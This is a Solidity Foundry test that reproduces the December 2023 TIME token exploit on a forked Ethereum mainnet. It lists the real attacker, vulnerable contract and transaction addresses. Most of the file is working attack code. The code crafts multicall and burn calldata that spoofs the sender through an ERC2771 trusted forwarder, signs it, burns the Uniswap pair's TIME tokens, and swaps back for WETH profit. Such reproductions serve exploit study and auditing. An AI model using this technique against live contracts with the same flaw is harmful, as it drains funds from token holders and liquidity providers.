// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

/*
    ## Key Info
        - Project: TIME
        - Date: 2023-12-06 23:11:59 (UTC)
        - Value Lost: 84.59 ETH ($200,000.00)
        - Vulnerability: ERC2771/MulitCall: Broken Input Validation 
        - [Attacker](https://etherscan.io/address/0xfde0d1575ed8e06fbf36256bcdfa1f359281455a)
        - [Vulnerable Contract](https://etherscan.io/address/0x4b0e9a7da8bab813efae92a6651019b8bd6c0a29)
        - [Attack Tx](https://etherscan.io/tx/0xecdd111a60debfadc6533de30fb7f55dc5ceed01dfadd30e4a7ebdb416d2f6b6)
        -:[Twitter](https://twitter.com/Phalcon_xyz/status/1732967384774746408)

1. 17,394USDC: https://polygonscan.com/tx/0x1b0e27f10542996ab2046bc5fb47297bcb1915df5ca79d7f81ccacc83e5fe5e4
2. 1.06ETH: https://explorer.phalcon.xyz/tx/eth/0x4ed1ec3d33c297560ed8f5a782b54d2c52adb20155c543fb64ba9065e45c046c?line=6
3. 0.73ETH: https://explorer.phalcon.xyz/tx/eth/0xc9c7b2ae3a6fb82aec113a328d53bfdd7ddd449e2f76da85d169321df20cd22a?line=6
4. 0.36ETH: https://explorer.phalcon.xyz/tx/eth/0xb5649546e4775e2453d5dd4ded898690fe860154474f92c2fdef4a5770dec025?line
5. 0.29ETH https://explorer.phalcon.xyz/tx/eth/0x913f68babb2851903df7efe6bbc7c83dbbd1c2a858df0d47a1328750f90305fb

*/
import "forge-std/Test.sol";
import {Ownable2Step, Ownable} from "@openzeppelin/contracts/access/Ownable2Step.sol";
import {IUniswapV2Router} from "../../src/interfaces/IUniswapV2Router.sol";
import {IWETH} from "../../src/interfaces/IWETH.sol";
import "../../src/interfaces/IUniswapV2Pair.sol";

interface Forwarder {

    struct ForwardRequest {
        address from;
        address to;
        uint256 value;
        uint256 gas;
        uint256 nonce;
        bytes data;
    }

    function execute(ForwardRequest memory req, bytes memory signature) external payable returns (bool, bytes memory);
    function getNonce(address from) external view returns (uint256);
    function verify(ForwardRequest memory req, bytes memory signature) external view returns (bool);

}

interface IERC20 {

    struct Checkpoint {
        uint32 fromBlock;
        uint224 votes;
    }

    struct MintRequest {
        address to;
        address primarySaleRecipient;
        uint256 quantity;
        uint256 price;
        address currency;
        uint128 validityStartTimestamp;
        uint128 validityEndTimestamp;
        bytes32 uid;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);
    event DelegateVotesChanged(address indexed delegate, uint256 previousBalance, uint256 newBalance);
    event PlatformFeeInfoUpdated(address indexed platformFeeRecipient, uint256 platformFeeBps);
    event PrimarySaleRecipientUpdated(address indexed recipient);
    event RoleAdminChanged(bytes32 indexed role, bytes32 indexed previousAdminRole, bytes32 indexed newAdminRole);
    event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);
    event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);
    event TokensMinted(address indexed mintedTo, uint256 quantityMinted);
    event TokensMintedWithSignature(address indexed signer, address indexed mintedTo, MintRequest mintRequest);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function DEFAULT_ADMIN_ROLE() external view returns (bytes32);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function burn(uint256 amount) external;
    function burnFrom(address account, uint256 amount) external;
    function checkpoints(address account, uint32 pos) external view returns (Checkpoint memory);
    function contractType() external pure returns (bytes32);
    function contractURI() external view returns (string memory);
    function contractVersion() external pure returns (uint8);
    function decimals() external view returns (uint8);
    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);
    function delegate(address delegatee) external;
    function delegateBySig(address delegatee, uint256 nonce, uint256 expiry, uint8 v, bytes32 r, bytes32 s) external;
    function delegates(address account) external view returns (address);
    function getPastTotalSupply(uint256 blockNumber) external view returns (uint256);
    function getPastVotes(address account, uint256 blockNumber) external view returns (uint256);
    function getPlatformFeeInfo() external view returns (address, uint16);
    function getRoleAdmin(bytes32 role) external view returns (bytes32);
    function getRoleMember(bytes32 role, uint256 index) external view returns (address);
    function getRoleMemberCount(bytes32 role) external view returns (uint256);
    function getVotes(address account) external view returns (uint256);
    function grantRole(bytes32 role, address account) external;
    function hasRole(bytes32 role, address account) external view returns (bool);
    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);
    function initialize(
        address _defaultAdmin,
        string memory _name,
        string memory _symbol,
        string memory _contractURI,
        address[] memory _trustedForwarders,
        address _primarySaleRecipient,
        address _platformFeeRecipient,
        uint256 _platformFeeBps
    ) external;
    function isTrustedForwarder(address forwarder) external view returns (bool);
    function mintTo(address to, uint256 amount) external;
    function mintWithSignature(MintRequest memory _req, bytes memory _signature) external payable;
    function multicall(bytes[] memory data) external returns (bytes[] memory results);
    function name() external view returns (string memory);
    function nonces(address owner) external view returns (uint256);
    function numCheckpoints(address account) external view returns (uint32);
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)
        external;
    function primarySaleRecipient() external view returns (address);
    function renounceRole(bytes32 role, address account) external;
    function revokeRole(bytes32 role, address account) external;
    function setContractURI(string memory _uri) external;
    function setPlatformFeeInfo(address _platformFeeRecipient, uint256 _platformFeeBps) external;
    function setPrimarySaleRecipient(address _saleRecipient) external;
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
    function symbol() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function verify(MintRequest memory _req, bytes memory _signature) external view returns (bool, address);

}

contract TestAttackContract is Test {

    IERC20 public TIME = IERC20(0x4b0E9a7dA8bAb813EfAE92A6651019B8bd6c0a29);
    IUniswapV2Router public uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Pair public timePair = IUniswapV2Pair(0x760dc1E043D99394A10605B2FA08F123D60faF84);
    IWETH public WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Forwarder public forwarder = Forwarder(0xc82BbE41f2cF04e3a8efA18F7032BDD7f6d98a81);
    uint256 public attackerPrivateKey = 0xA11CE;
    address public attacker;
    bytes32 private constant TYPEHASH =
        keccak256("ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,bytes data)");

    function setUp() public {
        vm.createSelectFork("mainnet", 18_730_460);
        attacker = vm.addr(attackerPrivateKey);
    }

    function testAttack() public {
        console.log("Initiating Attack");

        TIME.approve(address(uniswapRouter), type(uint256).max);
        WETH.approve(address(uniswapRouter), type(uint256).max);
        console.log("Step1: Approve UniswapRouter to spend unlimited TIME and WETH tokens");

        WETH.deposit{value: 5 ether}();
        console.log("Step2: Deposited 5 ETH for 5 WETH");

        uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            5 ether, 0, getPath(), address(this), 1_701_904_319
        );
        console.log("Step3: Swap 5 WETH for %s TIME Tokens", TIME.balanceOf(address(this)));

        bytes memory data = new bytes(168);
        data = bytes.concat(
            abi.encodeWithSignature(
                "multicall(bytes[])",
                bytes32(uint256(32)),
                bytes32(uint256(1)),
                bytes32(uint256(32)),
                bytes32(uint256(56))
            ),
            abi.encodeWithSignature("burn(uint256)", uint256(62_227_259_510_000_000_000_000_000_000)),
            abi.encode(bytes32(bytes20(address(timePair))))
        );
        console.log(
            "Step4: Crafted data for multicall and burn appending the timePair address at the end: This will be mishandled by the TIME contract"
        );

        bytes32 digest = getTypedDataHash(Forwarder.ForwardRequest(attacker, address(TIME), 0, 5_000_000, 0, data));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPrivateKey, digest);
        bytes memory signature = abi.encodePacked(r, s, v);
        address signer = ecrecover(digest, v, r, s);
        assertEq(attacker, signer);
        console.log("Step5: Signed the data with attacker private key: Produce valid signature");

        forwarder.execute(Forwarder.ForwardRequest(attacker, address(TIME), 0, 5_000_000, 0, data), signature);
        timePair.sync();
        console.log("Step6: Executed the forwarder contract with the crafted data and signature");
        console.log("Note: The timePair tokens are now burned and the attacker can now swap TIME for WETH for profit");

        console.log("Step7: Swap %s TIME Tokens for WETH", TIME.balanceOf(address(this)));
        uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            3_455_399_346_269_045_701_666_911_322, 0, getPath1(), address(this), 1_701_904_319
        );
        console.log("Step7: %s WETH has been received", WETH.balanceOf(address(this)));
        console.log("Balance of this address %s", WETH.balanceOf(address(this)));
        // WETH.withdraw(WETH.balanceOf(address(this)));
    }

    function getStructHash(Forwarder.ForwardRequest memory req) internal pure returns (bytes32) {
        return keccak256(abi.encode(TYPEHASH, req.from, req.to, req.value, req.gas, req.nonce, keccak256(req.data)));
    }

    // computes the hash of the fully encoded EIP-712 message for the domain, which can be used to recover the signer
    function getTypedDataHash(Forwarder.ForwardRequest memory req) public view returns (bytes32) {
        return keccak256(abi.encodePacked("\x19\x01", domainSeparator(), getStructHash(req)));
    }

    function domainSeparator() internal view returns (bytes32) {
        bytes32 hashedName = keccak256(bytes("GSNv2 Forwarder"));
        bytes32 hashedVersion = keccak256(bytes("0.0.1"));
        bytes32 typeHash =
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");

        return keccak256(abi.encode(typeHash, hashedName, hashedVersion, block.chainid, forwarder));
    }

    function getPath() internal view returns (address[] memory) {
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(TIME);
        return path;
    }

    function getPath1() internal view returns (address[] memory) {
        address[] memory path = new address[](2);
        path[0] = address(TIME);
        path[1] = address(WETH);
        return path;
    }

}
